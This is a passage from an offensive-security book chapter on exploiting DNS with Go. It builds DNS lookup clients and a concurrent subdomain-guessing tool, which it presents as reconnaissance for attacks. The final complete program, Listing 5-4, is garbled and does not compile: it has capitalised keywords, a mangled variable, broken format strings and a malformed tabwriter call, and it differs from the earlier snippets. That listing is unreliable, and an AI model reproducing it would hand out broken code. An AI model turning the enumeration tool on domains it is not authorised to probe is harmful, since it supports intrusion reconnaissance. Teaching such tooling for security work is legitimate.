<html><head></head><body><div id="sbo-rt-content"><h2 class="h2" id="ch5"><span epub:type="pagebreak" id="page_103"/><span class="big">5</span><br/>EXPLOITING DNS</h2>&#13;
<div class="imagel"><img src="Images/common.jpg" alt="Image" width="190" height="190"/></div>&#13;
<p class="snoindent">The <em>Domain Name System</em> <em>(DNS)</em> locates internet domain names and translates them to IP addresses. It can be an effective weapon in the hands of an attacker, because organizations commonly allow the protocol to egress restricted networks and they frequently fail to monitor its use adequately. It takes a little knowledge, but savvy attackers can leverage these issues throughout nearly every step of an attack chain, including reconnaissance, command and control (C2), and even data exfiltration. In this chapter, you’ll learn how to write your own utilities by using Go and third-party packages to perform some of these capabilities.</p>&#13;
<p class="indent">You’ll start by resolving hostnames and IP addresses to reveal the many types of DNS records that can be enumerated. Then you’ll use patterns illustrated in earlier chapters to build a massively concurrent subdomain-guessing tool. Finally, you’ll learn how to write your own DNS server and proxy, and you’ll use DNS tunneling to establish a C2 channel out of a restrictive network!</p>&#13;
<h3 class="h3" id="ch5lev1sec1"><span epub:type="pagebreak" id="page_104"/>Writing DNS Clients</h3>&#13;
<p class="noindent">Before exploring programs that are more complex, let’s get acquainted with some of the options available for client operations. Go’s built-in <code>net</code> package offers great functionality and supports most, if not all, record types. The upside to the built-in package is its straightforward API. For example, <code>LookupAddr(addr string)</code> returns a list of hostnames for a given IP address. The downside of using Go’s built-in package is that you can’t specify the destination server; instead, the package will use the resolver configured on your operating system. Another downside is that you can’t run deep inspection of the results.</p>&#13;
<p class="indent">To get around this, you’ll use an amazing third-party package called the <em>Go DNS package</em> written by Miek Gieben. This is our preferred DNS package because it’s highly modular, well written, and well tested. Use the following to install this package:</p>&#13;
<pre>$ <span class="codestrong1">go get github.com/miekg/dns</span></pre>&#13;
<p class="indent">Once the package is installed, you’re ready to follow along with the upcoming code examples. You’ll begin by performing A record lookups in order to resolve IP addresses for hostnames.</p>&#13;
<h4 class="h4" id="ch5lev2sec1">Retrieving A Records</h4>&#13;
<p class="noindent">Let’s start by performing a lookup for a <em>fully qualified domain name (FQDN)</em>, which specifies a host’s exact location in the DNS hierarchy. Then we’ll attempt to resolve that FQDN to an IP address, using a type of DNS record called an <em>A record</em>. We use A records to point a domain name to an IP address. <a href="ch05.xhtml#ch5list1">Listing 5-1</a> shows an example lookup. (All the code listings at the root location of / exist under the provided github repo <em><a href="https://github.com/blackhat-go/bhg/">https://github.com/blackhat-go/bhg/</a></em>.)</p>&#13;
<pre>package main&#13;
&#13;
import (&#13;
    "fmt"&#13;
&#13;
    "github.com/miekg/dns"&#13;
)&#13;
&#13;
func main() {&#13;
 <span class="ent">❶</span> var msg dns.Msg&#13;
 <span class="ent">❷</span> fqdn := dns.Fqdn("stacktitan.com")&#13;
 <span class="ent">❸</span> msg.SetQuestion(fqdn, dns.TypeA)&#13;
 <span class="ent">❹</span> dns.Exchange(&amp;msg, "8.8.8.8:53")&#13;
}</pre>&#13;
<p class="caption" id="ch5list1"><em>Listing 5-1: Retrieving an A record (</em><a href="https://github.com/blackhat-go/bhg/blob/master/ch-5/get_a/main.go">/ch-5/get_a/main.go</a><em>)</em></p>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_105"/>Start by creating a new <code>Msg</code> <span class="ent">❶</span> and then call <code>fqdn(</code><span class="codeitalic">string</span><code>)</code> to transform the domain into a FQDN that can be exchanged with a DNS server <span class="ent">❷</span>. Next, modify the internal state of the <code>Msg</code> with a call to <code>SetQuestion(</code><span class="codeitalic">string</span><code>, uint16)</code> by using the <code>TypeA</code> value to denote your intent to look up an A record <span class="ent">❸</span>. (This is a <code>const</code> defined in the package. You can view the other supported values in the package documentation.) Finally, place a call to <code>Exchange(*Msg,</code> <span class="codeitalic">string</span><code>)</code> <span class="ent">❹</span> in order to send the message to the provided server address, which is a DNS server operated by Google in this case.</p>&#13;
<p class="indent">As you can probably tell, this code isn’t very useful. Although you’re sending a query to a DNS server and asking for the A record, you aren’t processing the answer; you aren’t doing anything meaningful with the result. Prior to programmatically doing that in Go, let’s first review what the DNS answer looks like so that we can gain a deeper understanding of the protocol and the different query types.</p>&#13;
<p class="indent">Before you execute the program in <a href="ch05.xhtml#ch5list1">Listing 5-1</a>, run a packet analyzer, such as Wireshark or tcpdump, to view the traffic. Here’s an example of how you might use tcpdump on a Linux host:</p>&#13;
<pre>$ <span class="codestrong1">sudo tcpdump -i eth0 -n udp port 53</span></pre>&#13;
<p class="indent">In a separate terminal window, compile and execute your program like this:</p>&#13;
<pre>$ <span class="codestrong1">go run main.go</span></pre>&#13;
<p class="indent">Once you execute your code, you should see a connection to 8.8.8.8 over UDP 53 in the output from your packet capture. You should also see details about the DNS protocol, as shown here:</p>&#13;
<pre>$ <span class="codestrong1">sudo tcpdump -i eth0 -n udp port 53</span>&#13;
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode&#13;
listening on ens33, link-type EN10MB (Ethernet), capture size 262144 bytes&#13;
23:55:16.523741 IP 192.168.7.51.53307 &gt; 8.8.8.8.53:<span class="ent">❶</span> 25147+ A?<span class="ent">❷</span> stacktitan.com. (32)&#13;
23:55:16.650905 IP 8.8.8.8.53 &gt; 192.168.7.51.53307: 25147 1/0/0 A 104.131.56.170 (48) <span class="ent">❸</span></pre>&#13;
<p class="indent">The packet capture output produces a couple of lines that require further explanation. First, a query is being placed from 192.168.7.51 to 8.8.8.8 by using UDP 53 <span class="ent">❶</span> while requesting a DNS A record <span class="ent">❷</span>. The response <span class="ent">❸</span> is returned from Google’s 8.8.8.8 DNS server, which contains the resolved IP address, 104.131.56.170.</p>&#13;
<p class="indent">Using a packet analyzer such as tcpdump, you’re able to resolve the domain name <code>stacktitan.com</code> to an IP address. Now let’s take a look at how to extract that information by using Go.</p>&#13;
<h4 class="h4" id="ch5lev2sec2"><span epub:type="pagebreak" id="page_106"/>Processing Answers from a Msg struct</h4>&#13;
<p class="noindent">The returned values from <code>Exchange(*Msg,</code> <span class="codeitalic">string</span><code>)</code> are <code>(*Msg,</code> <span class="codeitalic">error</span><code>)</code>. Returning the <code>error</code> type makes sense and is common in Go idioms, but why does it return <code>*Msg</code> if that’s what you passed in? To clarify this, look at how the <code>struct</code> is defined in the source:</p>&#13;
<pre>type Msg struct {&#13;
    MsgHdr&#13;
    Compress    bool       `json:"-"` // If true, the message will be compressed...&#13;
 <span class="ent">❶</span> Question    []Question            // Holds the RR(s) of the question section.&#13;
 <span class="ent">❷</span> Answer      []RR                  // Holds the RR(s) of the answer section.&#13;
    Ns          []RR                  // Holds the RR(s) of the authority section.&#13;
    Extra       []RR                  // Holds the RR(s) of the additional section.&#13;
}</pre>&#13;
<p class="indent">As you can see, the <code>Msg</code> <code>struct</code> holds both questions and answers. This lets you consolidate all your DNS questions and their answers into a single, unified structure. The <code>Msg</code> type has various methods that make working with the data easier. For example, the <code>Question</code> slice <span class="ent">❶</span> is being modified with the convenience method <code>SetQuestion()</code>. You could modify this slice directly by using <code>append()</code> and achieve the same outcome. The <code>Answer</code> slice <span class="ent">❷</span> holds the response to the queries and is of type <code>RR</code>. <a href="ch05.xhtml#ch5list2">Listing 5-2</a> demonstrates how to process the answers.</p>&#13;
<pre>package main&#13;
&#13;
import (&#13;
    "fmt"&#13;
&#13;
    "github.com/miekg/dns"&#13;
)&#13;
&#13;
func main() {&#13;
    var msg dns.Msg&#13;
    fqdn := dns.Fqdn("stacktitan.com")&#13;
    msg.SetQuestion(fqdn, dns.TypeA)&#13;
 <span class="ent">❶</span> in, err := dns.Exchange(&amp;msg, "8.8.8.8:53")&#13;
    if err != nil {&#13;
        panic(err)&#13;
    }&#13;
 <span class="ent">❷</span> if len(in.Answer) &lt; 1 {&#13;
        fmt.Println("No records")&#13;
        return&#13;
    }&#13;
    for _, answer := range in.Answer {&#13;
        if a<span class="ent">❸</span>, ok:= answer.(*dns.A)<span class="ent">❹</span>; ok {&#13;
         <span class="ent">❺</span> fmt.Println(a.A)&#13;
        }&#13;
    }&#13;
}</pre>&#13;
<p class="caption" id="ch5list2"><em>Listing 5-2: Processing DNS answers (</em><a href="https://github.com/blackhat-go/bhg/blob/master/ch-5/get_all_a/main.go">/ch-5/get_all_a/main.go</a><em>)</em></p>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_107"/>Our example begins by storing the values returned from <code>Exchange</code>, checking whether there was an error, and if so, calling <code>panic()</code> to stop the program <span class="ent">❶</span>. The <code>panic()</code> function lets you quickly see the stack trace and identify where the error occurred. Next, validate that the length of the <code>Answer</code> slice is at least 1 <span class="ent">❷</span>, and if it isn’t, indicate that there are no records and immediately return—after all, there will be legitimate instances when the domain name cannot be resolved.</p>&#13;
<p class="indent">The type <code>RR</code> is an interface with only two defined methods, and neither allows access to the IP address stored in the answer. To access those IP addresses, you’ll need to perform a type assertion to create an instance of the data as your desired type.</p>&#13;
<p class="indent">First, loop over all the answers. Next, perform the type assertion on the answer to ensure that you’re dealing with a <code>*dns.A</code> type <span class="ent">❸</span>. When performing this action, you can receive two values: the data as the asserted type and a <code>bool</code> representing whether the assertion was successful <span class="ent">❹</span>. After checking whether the assertion was successful, print the IP address stored in <code>a.A</code> <span class="ent">❺</span>. Although the type is <code>net.IP</code>, it does implement a <code>String()</code> method, so you can easily print it.</p>&#13;
<p class="indent">Spend time with this code, modifying the DNS query and exchange to search for additional records. The type assertion may be unfamiliar, but it’s a similar concept to type casting in other languages.</p>&#13;
<h4 class="h4" id="ch5lev2sec3">Enumerating Subdomains</h4>&#13;
<p class="noindent">Now that you know how to use Go as a DNS client, you can create useful tools. In this section, you’ll create a subdomain-guessing utility. Guessing a target’s subdomains and other DNS records is a foundational step in reconnaissance, because the more subdomains you know, the more you can attempt to attack. You’ll supply our utility a candidate wordlist (a dictionary file) to use for guessing subdomains.</p>&#13;
<p class="indent">With DNS, you can send requests as fast as your operating system can handle the processing of packet data. While the language and runtime aren’t going to become a bottleneck, the destination server will. Controlling the concurrency of your program will be important here, just as it has been in previous chapters.</p>&#13;
<p class="indent">First, create a new directory in your <code>GOPATH</code> called <em>subdomain_guesser</em>, and create a new file <em>main.go</em>. Next, when you first start writing a new tool, you must decide which arguments the program will take. This subdomain-guessing program will take several arguments, including the target domain, the filename containing subdomains to guess, the destination DNS server to use, and the number of workers to launch. Go provides a useful package for parsing command line options called <code>flag</code> that you’ll use to handle your command line arguments. Although we don’t use the <code>flag</code> package across all of our code examples, we’ve opted to use it in this case to demonstrate more robust, elegant argument parsing. <a href="ch05.xhtml#ch5list3">Listing 5-3</a> shows our argument-parsing code.</p>&#13;
<pre><span epub:type="pagebreak" id="page_108"/>package main&#13;
&#13;
import (&#13;
    "flag"&#13;
)&#13;
&#13;
func main() {&#13;
    var (&#13;
        flDomain      = flag.String("domain", "", "The domain to perform guessing against.") <span class="ent">❶</span>&#13;
        flWordlist    = flag.String("wordlist", "", "The wordlist to use for guessing.")&#13;
        flWorkerCount = flag.Int("c", 100, "The amount of workers to use.") <span class="ent">❷</span>&#13;
        flServerAddr  = flag.String("server", "8.8.8.8:53", "The DNS server to use.")&#13;
    )&#13;
    flag.Parse() <span class="ent">❸</span>&#13;
}</pre>&#13;
<p class="caption" id="ch5list3"><em>Listing 5-3: Building a subdomain guesser (</em><a href="https://github.com/blackhat-go/bhg/blob/master/ch-5/subdomain_guesser/main.go">/ch-5/subdomain_guesser/main.go</a><em>)</em></p>&#13;
<p class="indent">First, the code line declaring the <code>flDomain</code> variable <span class="ent">❶</span> takes a <code>String</code> argument and declares an empty string default value for what will be parsed as the <code>domain</code> option. The next pertinent line of code is the <code>flWorkerCount</code> variable declaration <span class="ent">❷</span>. You need to provide an <code>Integer</code> value as the <code>c</code> command line option. In this case, set this to 100 default workers. But this value is probably too conservative, so feel free to increase the number when testing. Finally, a call to <code>flag.Parse()</code> <span class="ent">❸</span> populates your variables by using the provided input from the user.</p>&#13;
<div class="note">&#13;
<p class="notet"><strong><span class="notes">NOTE</span></strong></p>&#13;
<p class="notep"><em>You may have noticed that the example is going against Unix law in that it has defined optional arguments that aren’t optional. Please feel free to use <span class="codeitalic">os.Args</span> here. We just find it easier and faster to let the flag package do all the work.</em></p>&#13;
</div>&#13;
<p class="indent">If you try to build this program, you should receive an error about unused variables. Add the following code immediately after your call to <code>flag.Parse()</code>. This addition prints the variables to stdout along with code, ensuring that the user provided <code>-domain</code> and <code>-wordlist</code>:</p>&#13;
<pre>if *flDomain == "" || *flWordlist == "" {&#13;
    fmt.Println("-domain and -wordlist are required")&#13;
    os.Exit(1)&#13;
}&#13;
fmt.Println(*flWorkerCount, *flServerAddr)</pre>&#13;
<p class="indent">To allow your tool to report which names were resolvable along with their respective IP addresses, you’ll create a <code>struct</code> type to store this information. Define it above the <code>main()</code> function:</p>&#13;
<pre>type result struct {&#13;
    IPAddress string&#13;
    Hostname string&#13;
}</pre>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_109"/>You’ll query two main record types—A and CNAME—for this tool. You’ll perform each query in a separate function. It’s a good idea to keep your functions as small as possible and to have each perform one thing well. This style of development allows you to write smaller tests in the future.</p>&#13;
<h5 class="h5">Querying A and CNAME Records</h5>&#13;
<p class="noindent">You’ll create two functions to perform queries: one for A records and the other for CNAME records. Both functions accept a FQDN as the first argument and the DNS server address as the second. Each should return a slice of strings and an error. Add these functions to the code you began defining in <a href="ch05.xhtml#ch5list3">Listing 5-3</a>. These functions should be defined outside <code>main()</code>.</p>&#13;
<pre>func lookupA(fqdn, serverAddr string) ([]string, error) {&#13;
    var m dns.Msg&#13;
    var ips []string&#13;
    m.SetQuestion(dns.Fqdn(fqdn), dns.TypeA)&#13;
    in, err := dns.Exchange(&amp;m, serverAddr)&#13;
    if err != nil {&#13;
        return ips, err&#13;
    }&#13;
    if len(in.Answer) &lt; 1 {&#13;
        return ips, errors.New("no answer")&#13;
    }&#13;
    for _, answer := range in.Answer {&#13;
        if a, ok := answer.(*dns.A); ok {&#13;
            ips = append(ips, a.A.String())&#13;
        }&#13;
    }&#13;
    return ips, nil&#13;
}&#13;
&#13;
func lookupCNAME(fqdn, serverAddr string) ([]string, error) {&#13;
    var m dns.Msg&#13;
    var fqdns []string&#13;
    m.SetQuestion(dns.Fqdn(fqdn), dns.TypeCNAME)&#13;
    in, err := dns.Exchange(&amp;m, serverAddr)&#13;
    if err != nil {&#13;
        return fqdns, err&#13;
    }&#13;
    if len(in.Answer) &lt; 1 {&#13;
        return fqdns, errors.New("no answer")&#13;
    }&#13;
    for _, answer := range in.Answer {&#13;
        if c, ok := answer.(*dns.CNAME); ok {&#13;
            fqdns = append(fqdns, c.Target)&#13;
        }&#13;
    }&#13;
    return fqdns, nil&#13;
}</pre>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_110"/>This code should look familiar because it’s nearly identical to the code you wrote in the first section of this chapter. The first function, <code>lookupA</code>, returns a list of IP addresses, and <code>lookupCNAME</code> returns a list of hostnames.</p>&#13;
<p class="indent"><em>CNAME</em>, or <em>canonical name</em>, records point one FQDN to another one that serves as an alias for the first. For instance, say the owner of the <em>example.com</em> organization wants to host a WordPress site by using a WordPress hosting service. That service may have hundreds of IP addresses for balancing all of their users’ sites, so providing an individual site’s IP address would be infeasible. The WordPress hosting service can instead provide a canonical name (a CNAME) that the owner of <em>example.com</em> can reference. So <em>www.example.com</em> might have a CNAME pointing to <em><a href="http://someserver.hostingcompany.org">someserver.hostingcompany.org</a></em>, which in turn has an A record pointing to an IP address. This allows the owner of <em>example.com</em> to host their site on a server for which they have no IP information.</p>&#13;
<p class="indent">Often this means you’ll need to follow the trail of CNAMES to eventually end up at a valid A record. We say <em>trail</em> because you can have an endless chain of CNAMES. Place the function in the following code outside <code>main()</code> to see how you can use the trail of CNAMES to track down the valid A record:</p>&#13;
<pre>func lookup(fqdn, serverAddr string) []result {&#13;
 <span class="ent">❶</span> var results []result&#13;
 <span class="ent">❷</span> var cfqdn = fqdn // Don't modify the original.&#13;
    for {&#13;
     <span class="ent">❸</span> cnames, err := lookupCNAME(cfqdn, serverAddr)&#13;
     <span class="ent">❹</span> if err == nil &amp;&amp; len(cnames) &gt; 0 {&#13;
         <span class="ent">❺</span> cfqdn = cnames[0]&#13;
         <span class="ent">❻</span> continue // We have to process the next CNAME.&#13;
        }&#13;
     <span class="ent">❼</span> ips, err := lookupA(cfqdn, serverAddr)&#13;
        if err != nil {&#13;
            break // There are no A records for this hostname.&#13;
        }&#13;
     <span class="ent">❽</span> for _, ip := range ips {&#13;
            results = append(results, result{IPAddress: ip, Hostname: fqdn})&#13;
        }&#13;
     <span class="ent">❾</span> break // We have processed all the results.&#13;
    }&#13;
    return results&#13;
}</pre>&#13;
<p class="indent">First, define a slice to store results <span class="ent">❶</span>. Next, create a copy of the FQDN passed in as the first argument <span class="ent">❷</span>, not only so you don’t lose the original FQDN that was guessed, but also so you can use it on the first query attempt. After starting an infinite loop, try to resolve the CNAMEs for the FQDN <span class="ent">❸</span>. If no errors occur and at least one CNAME is returned <span class="ent">❹</span>, set <code>cfqdn</code> to the CNAME returned <span class="ent">❺</span>, using <code>continue</code> to return to the beginning of the loop <span class="ent">❻</span>. This process allows you to follow the trail of CNAMES until a failure occurs. If there’s a failure, which indicates that you’ve reached the end of the chain, you can then look for A records <span class="ent">❼</span>; but if there’s an error, which indicates <span epub:type="pagebreak" id="page_111"/>something went wrong with the record lookup, then you leave the loop early. If there are valid A records, append each of the IP addresses returned to your <code>results</code> slice <span class="ent">❽</span> and break out of the loop <span class="ent">❾</span>. Finally, return the <code>results</code> to the caller.</p>&#13;
<p class="indent">Our logic associated with the name resolution seems sound. However, you haven’t accounted for performance. Let’s make our example goroutine-friendly so you can add concurrency.</p>&#13;
<h5 class="h5">Passing to a Worker Function</h5>&#13;
<p class="noindent">You’ll create a pool of goroutines that pass work to a <em>worker function</em>, which performs a unit of work. You’ll do this by using channels to coordinate work distribution and the gathering of results. Recall that you did something similar in <a href="ch02.xhtml#ch2">Chapter 2</a>, when you built a concurrent port scanner.</p>&#13;
<p class="indent">Continue to expand the code from <a href="ch05.xhtml#ch5list3">Listing 5-3</a>. First, create the <code>worker()</code> function and place it outside <code>main()</code>. This function takes three channel arguments: a channel for the worker to signal whether it has closed, a channel of domains on which to receive work, and a channel on which to send results. The function will need a final string argument to specify the DNS server to use. The following code shows an example of our <code>worker()</code> function:</p>&#13;
<pre>type empty struct{} <span class="ent">❶</span>&#13;
&#13;
func worker(tracker chan empty, fqdns chan string, gather chan []result, serverAddr string) {&#13;
    for fqdn := range fqdns { <span class="ent">❷</span>&#13;
        results := lookup(fqdn, serverAddr)&#13;
        if len(results) &gt; 0 {&#13;
            gather &lt;- results <span class="ent">❸</span>&#13;
        }&#13;
    }&#13;
    var e empty&#13;
    tracker &lt;- e <span class="ent">❹</span>&#13;
}</pre>&#13;
<p class="indent">Before introducing the <code>worker()</code> function, first define the type <code>empty</code> to track when the worker finishes <span class="ent">❶</span>. This is a <code>struct</code> with no fields; you use an empty <code>struct</code> because it’s 0 bytes in size and will have little impact or overhead when used. Then, in the <code>worker()</code> function, loop over the domains channel <span class="ent">❷</span>, which is used to pass in FQDNs. After getting results from your <code>lookup()</code> function and checking to ensure there is at least one result, send the results on the <code>gather</code> channel <span class="ent">❸</span>, which accumulates the results back in <code>main()</code>. After the work loop exits because the channel has been closed, an <code>empty</code> struct is sent on the <code>tracker</code> channel <span class="ent">❹</span> to signal the caller that all work has been completed. Sending the empty <code>struct</code> on the tracker channel is an important last step. If you don’t do this, you’ll have a race condition, because the caller may exit before the <code>gather</code> channel receives results.</p>&#13;
<p class="indent">Since all of the prerequisite structure is set up at this point, let’s refocus our attention back to <code>main()</code> to complete the program we began in <a href="ch05.xhtml#ch5list3">Listing 5-3</a>. <span epub:type="pagebreak" id="page_112"/>Define some variables that will hold the results and the channels that will be passed to <code>worker</code><code>()</code>. Then append the following code into <code>main()</code>:</p>&#13;
<pre>var results []result&#13;
fqdns := make(chan string, *flWorkerCount)&#13;
gather := make(chan []result)&#13;
tracker := make(chan empty)</pre>&#13;
<p class="indent">Create the <code>fqdns</code> channel as a buffered channel by using the number of workers provided by the user. This allows the workers to start slightly faster, as the channel can hold more than a single message before blocking the sender.</p>&#13;
<h5 class="h5">Creating a Scanner with bufio</h5>&#13;
<p class="noindent">Next, open the file provided by the user to consume as a word list. With the file open, create a new <code>scanner</code> by using the <code>bufio</code> package. The scanner allows you to read the file one line at a time. Append the following code into <code>main()</code>:</p>&#13;
<pre>fh, err := os.Open(*flWordlist)&#13;
if err != nil {&#13;
    panic(err)&#13;
}&#13;
defer fh.Close()&#13;
scanner := bufio.NewScanner(fh)</pre>&#13;
<p class="indent">The built-in function <code>panic()</code> is used here if the error returned is not <code>nil</code>. When you’re writing a package or program that others will use, you should consider presenting this information in a cleaner format.</p>&#13;
<p class="indent">You’ll use the new <code>scanner</code> to grab a line of text from the supplied word list and create a FQDN by combining the text with the domain the user provides. You’ll send the result on the <code>fqdns</code> channel. But you must start the workers first. The order of this is important. If you were to send your work down the <code>fqdns</code> channel without starting the workers, the buffered channel would eventually become full, and your producers would block. You’ll add the following code to your <code>main()</code> function. Its purpose is to start the worker goroutines, read your input file, and send work on your <code>fqdns</code> channel.</p>&#13;
<pre><span class="ent">❶</span> for i := 0; i &lt; *flWorkerCount; i++ {&#13;
       go worker(tracker, fqdns, gather, *flServerAddr)&#13;
   }&#13;
&#13;
<span class="ent">❷</span> for scanner.Scan() {&#13;
       fqdns &lt;- fmt.Sprintf("%s.%s", scanner.Text()<span class="ent">❸</span>, *flDomain)&#13;
   }</pre>&#13;
<p class="indent">Creating the workers <span class="ent">❶</span> by using this pattern should look similar to what you did when building your concurrent port scanner: you used a <code>for</code> loop until you reached the number provided by the user. To grab each line <span epub:type="pagebreak" id="page_113"/>in the file, <code>scanner.Scan()</code> is used in a loop <span class="ent">❷</span>. This loop ends when there are no more lines to read in the file. To get a string representation of the text from the scanned line, use <code>scanner.Text()</code> <span class="ent">❸</span>.</p>&#13;
<p class="indent">The work has been launched! Take a second to bask in greatness. Before reading the next code, think about where you are in the program and what you’ve already done in this book. Try to complete this program and then continue to the next section, where we’ll walk you through the rest.</p>&#13;
<h5 class="h5">Gathering and Displaying the Results</h5>&#13;
<p class="noindent">To finish up, first start an anonymous goroutine that will gather the results from the workers. Append the following code into <code>main():</code></p>&#13;
<pre>go func() {&#13;
    for r := range gather {&#13;
     <span class="ent">❶</span> results = append(results, r...<span class="ent">❷</span>)&#13;
    }&#13;
    var e empty&#13;
 <span class="ent">❸</span> tracker &lt;- e&#13;
}()</pre>&#13;
<p class="indent">By looping over the <code>gather</code> channel, you append the received results onto the <code>results</code> slice <span class="ent">❶</span>. Since you’re appending a slice to another slice, you must use the <code>...</code> syntax <span class="ent">❷</span>. After you close the <code>gather</code> channel and the loop ends, send an empty <code>struct</code> to the tracker channel as you did earlier <span class="ent">❸</span>. This is done to prevent a race condition in case <code>append()</code> doesn’t finish by the time you eventually present the results to the user.</p>&#13;
<p class="indent">All that’s left is closing the channels and presenting the results. Include the following code at the bottom of <code>main()</code> in order to close the channels and present the results to the user:</p>&#13;
<pre><span class="ent">❶</span> close(fqdns)&#13;
<span class="ent">❷</span> for i := 0; i &lt; *flWorkerCount; i++ {&#13;
       &lt;-tracker&#13;
   }&#13;
<span class="ent">❸</span> close(gather)&#13;
<span class="ent">❹</span> &lt;-tracker</pre>&#13;
<p class="indent">The first channel that can be closed is <code>fqdns</code> <span class="ent">❶</span> because you’ve already sent all the work on this channel. Next, you need to receive on the <code>tracker</code> channel one time for each of the workers <span class="ent">❷</span>, allowing the workers to signal that they exited completely. With all of the workers accounted for, you can close the <code>gather</code> channel <span class="ent">❸</span> because there are no more results to receive. Finally, receive one more time on the <code>tracker</code> channel to allow the gathering goroutine to finish completely <span class="ent">❹</span>.</p>&#13;
<p class="indent">The results aren’t yet presented to the user. Let’s fix that. If you wanted to, you could easily loop over the <code>results</code> slice and print the <code>Hostname</code> and <code>IPAddress</code> fields by using <code>fmt.Printf()</code>. We prefer, instead, to use one of Go’s several great built-in packages for presenting data; <code>tabwriter</code> is one of our favorites. It allows you to present data in nice, even columns broken up by <span epub:type="pagebreak" id="page_114"/>tabs. Add the following code to the end of <code>main()</code> to use <code>tabwriter</code> to print your results:</p>&#13;
<pre>w := tabwriter.NewWriter(os.Stdout, 0, 8, 4, ' ', 0)&#13;
for _, r := range results {&#13;
    fmt.Fprintf(w, "%s\t%s\n", r.Hostname, r.IPAddress)&#13;
}&#13;
w.Flush()</pre>&#13;
<p class="indent"><a href="ch05.xhtml#ch5list4">Listing 5-4</a> shows the program in its entirety.</p>&#13;
<pre>Package main&#13;
&#13;
import (&#13;
    "bufio"&#13;
    "errors"&#13;
    "flag"&#13;
    "fmt"&#13;
    "os"&#13;
    "text/tabwriter"&#13;
&#13;
    "github.com/miekg/dns"&#13;
)&#13;
&#13;
func lookupA(fqdn, serverAddr string) ([]string, error) {&#13;
    var m dns.Msg&#13;
    var ips []string&#13;
    m.SetQuestion(dns.Fqdn(fqdn), dns.TypeA)&#13;
    in, err := dns.Exchange(&amp;m, serverAddr)&#13;
    if err != nil {&#13;
        return ips, err&#13;
    }&#13;
    if len(in.Answer) &lt; 1 {&#13;
        return ips, errors.New("no answer")&#13;
    }&#13;
    for _, answer := range in.Answer {&#13;
        if a, ok := answer.(*dns.A); ok {&#13;
            ips = append(ips, a.A.String())&#13;
            return ips, nil&#13;
        }&#13;
    }&#13;
    return ips, nil&#13;
}&#13;
&#13;
func lookupCNAME(fqdn, serverAddr string) ([]string, error) {&#13;
    var m dns.Msg&#13;
    var fqdns []string&#13;
    m.SetQuestion(dns.Fqdn(fqdn), dns.TypeCNAME)&#13;
    in, err := dns.Exchange(&amp;m, serverAddr)&#13;
    if err != nil {&#13;
        return fqdns, err&#13;
    }&#13;
    if len(in.Answer) &lt; 1 {&#13;
<span epub:type="pagebreak" id="page_115"/>        return fqdns, errors.New("no answer")&#13;
    }&#13;
    for _, answer := range in.Answer {&#13;
        if c, ok := answer.(*dns.CNAME); ok {&#13;
            fqdns = append(fqdns, c.Target)&#13;
        }&#13;
    }&#13;
    return fqdns, nil&#13;
}&#13;
&#13;
func lookup(fqdn, serverAddr string) []result {&#13;
    var results []result&#13;
    var cfqdn = fqdn // Don't modify the original.&#13;
    For {&#13;
        cnames, err := lookupCNAME(cfqdn, serverAddr)&#13;
        if err == nil &amp;&amp; len(cnames) &gt; 0 {&#13;
            cfqdn = cnames[0]&#13;
            continue // We have to process the next CNAME.&#13;
        }&#13;
        ips, err := lookupA(cfqdn, serverAddr)&#13;
        if err != nil {&#13;
            break // There are no A records for this hostname.&#13;
        }&#13;
        for _, ip := range ips {&#13;
            results = append(results, result{IPAddress: ip, Hostname: fqdn})&#13;
        }&#13;
        break // We have processed all the results.&#13;
    }&#13;
    return results&#13;
}&#13;
&#13;
func worker(tracker chan empty, fqdns chan string, gather chan []result, serverAddr string) {&#13;
    for fqdn := range fqdns {&#13;
        results := lookup(fqdn, serverAddr)&#13;
        if len(results) &gt; 0 {&#13;
            gather &lt;- results&#13;
        }&#13;
    }&#13;
    var e empty&#13;
    tracker &lt;- e&#13;
}&#13;
&#13;
type empty struct{}&#13;
&#13;
type result struct {&#13;
    IPAddress string&#13;
    Hostname string&#13;
}&#13;
&#13;
func main() {&#13;
    var (&#13;
        flDomain      = flag.String("domain", "", "The domain to perform guessing against.")&#13;
        flWordlist    = flag.String("wordlist", "", "The wordlist to use for guessing.")&#13;
        flWorkerCount = flag.Int("c", 100, "The amount of workers to use.")&#13;
        flServerAddr  = flag.String("server", "8.8.8.8:53", "The DNS server to use.")&#13;
<span epub:type="pagebreak" id="page_116"/>    )&#13;
    flag.Parse()&#13;
&#13;
    if *flDomain == "" || *flWordlist == "" {&#13;
        fmt.Println("-domain and -wordlist are required")&#13;
        os.Exit(1)&#13;
    }&#13;
&#13;
    var results []result&#13;
&#13;
    fqdns := make(chan string, *flWorkerCount)&#13;
    gather := make(chan []result)&#13;
    tracker := make(chan empty)&#13;
&#13;
    fh, err := os.Open(*flWordlist)&#13;
    if err != nil {&#13;
        panic(err)&#13;
    }&#13;
    defer fh.Close()&#13;
    scanner := bufio.NewScanner(fh)&#13;
&#13;
    for I := 0; i &lt; *flWorkerCount; i++ {&#13;
        go worker(tracker, fqdns, gather, *flServerAddr)&#13;
    }&#13;
&#13;
    for scanner.Scan() {&#13;
        fqdns &lt;- fmt.Sprintf"%s.%", scanner.Text(), *flDomain)&#13;
    }&#13;
    // Note: We could check scanner.Err() here.&#13;
&#13;
    go func() {&#13;
        for r := range gather {&#13;
            results = append(results, I.)&#13;
        }&#13;
        var e empty&#13;
        tracker &lt;- e&#13;
    }()&#13;
&#13;
    close(fqdns)&#13;
    for i := 0; i &lt; *flWorkerCount; i++ {&#13;
        &lt;-tracker&#13;
    }&#13;
    close(gather)&#13;
    &lt;-tracker&#13;
&#13;
    w := tabwriter.NewWriter(os.Stdout, 0, 8' ', ' ', 0)&#13;
    for _, r := range results {&#13;
        fmt.Fprint"(w, "%s\"%s\n", r.Hostname, r.IPAddress)&#13;
    }&#13;
    w.Flush()&#13;
}</pre>&#13;
<p class="caption" id="ch5list4"><em>Listing 5-4: The complete subdomain-guessing program (</em><a href="https://github.com/blackhat-go/bhg/blob/master/ch-5/subdomain_guesser/main.go">/ch-5/subdomain_guesser/main.go</a><em>)</em></p>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_117"/>Your subdomain-guessing program is complete! You should now be able to build and execute your shiny new subdomain-guessing tool. Try it with word lists or dictionary files in open source repositories (you can find plenty with a Google search). Play around with the number of workers; you may find that if you go too fast, you’ll get varying results. Here’s a run from the authors’ system using 100 workers:</p>&#13;
